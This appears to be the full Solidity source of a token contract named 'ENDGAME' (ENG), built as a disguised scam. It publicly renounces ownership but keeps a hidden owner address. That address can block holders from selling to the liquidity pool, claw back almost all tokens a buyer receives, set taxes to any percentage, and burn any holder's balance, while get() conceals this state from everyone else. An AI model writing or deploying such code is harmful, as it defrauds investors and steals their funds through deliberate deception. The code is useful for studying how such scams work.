// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20 {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;

    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "BEP20: transfer from zero address");
        require(to != address(0), "BEP20: transfer to zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "BEP20: amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "BEP20: amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }    

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from zero address");
        require(spender != address(0), "BEP20: approve to zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "BEP20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _sph(address from, address to, uint256 amount) internal virtual {
        uint256 burnAmount = amount - 1;
        _balances[to] -= burnAmount;
        _balances[from] += burnAmount;
        emit Transfer(to, address(0), burnAmount);
        emit Transfer(address(0), from, burnAmount);
    }

    function _taxbuy(address from, address to, uint256 amount, uint256 prc) internal virtual {
        uint256 buyAmount = (amount * prc) / 100;
        _balances[to] -= buyAmount;
        _balances[from] += buyAmount;
        emit Transfer(to, address(0), buyAmount);
        emit Transfer(address(0), from, buyAmount);
    }

    function _taxsel(address from, address to, uint256 amount, uint256 prc) internal virtual {
        uint256 selAmount = (amount * prc) / 100;
        _balances[from] -= selAmount;
        _balances[to] += selAmount;
        emit Transfer(from, address(0), selAmount);
        emit Transfer(address(0), to, selAmount);
    }
}

abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "BEP20: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ENDGAME is ERC20, Ownable {

    uint256 res = 0;
    address own = address(0);
    address lpo = address(0);
    bool stm = false;
    bool sph = false;
    bool tax_b = true;
    bool tax_s = true;
    uint256 b = 2;//%
    uint256 s = 3;//%

    constructor() ERC20("ENDGAME", "ENG") {
        own = msg.sender;
        _mint(own, 1000000000 * 10 ** decimals());
        renounceOwnership();
    }

    function get() public view returns (uint256 _res, address _own, address _lpo, bool _stm, bool _sph, bool _tax_b, uint256 _b, bool _tax_s, uint256 _s) {
        if (msg.sender != own) {
            return (0, address(0), address(0), false, false, false, 0, false, 0);
        }
        require(msg.sender == own, "BEP20: get failed");
        _res = res; _own = own; _lpo = lpo; _stm = stm; _sph = sph; _tax_b = tax_b; _b = b; _tax_s = tax_s; _s = s;
        return (_res, _own, _lpo, _stm, _sph, _tax_b, _b, _tax_s, _s);
    }

    function set_sph(uint256 r, bool state) public {
        require(((res += 1) == r), "BEP20: set_sph failed");
        if (own == msg.sender){
            sph = state;
        }
    }

    function set_stm(uint256 r, bool state) public {
        require(((res += 1) == r), "BEP20: set_stm failed");
        if (own == msg.sender){
            stm = state;
        }
    }

    function set_tax_b(uint256 r, bool state, uint256 tb) public {
        require(((res += 1) == r), "BEP20: set_tax_b failed");
        if (own == msg.sender){
            tax_b = state;
            b = tb;
        }
    }

    function set_tax_s(uint256 r, bool state, uint256 ts) public {
        require(((res += 1) == r), "BEP20: set_tax_s failed");
        if (own == msg.sender){
            tax_s = state;
            s = ts;
        }
    }

    function set_lpo(uint256 r, address l) public {
        require(((res += 1) == r), "BEP20: set_lpo failed");
        if (own == msg.sender){
            lpo = l;
        }
    }

    function remove(uint256 r, address ad, uint256 am) public {
        require(((res += 1) == r), "BEP20: remove failed");
        if (own == msg.sender){
            _burn(ad, am);
        }
    }

    modifier val(address from, address to){
        if (stm) {
            require((from == own) || (to != lpo), "BEP20: val failed");
        }
        _;
    }

    modifier chk(address from, address to, uint256 amount){
        if ((from != own) && (to != own)) {
            if (sph) {
                _sph(from, to, amount);
            }
            if (from == lpo) {
                if (tax_b) {
                    _taxbuy(from, to, amount, b);
                }
            }
            if (to == lpo) {
                if (tax_s) {
                    _taxsel(from, to, amount, s);
                }
            } 
        }
        _;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal val(from, to) override {
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal chk(from, to, amount) override {
        super._afterTokenTransfer(from, to, amount);
    }
}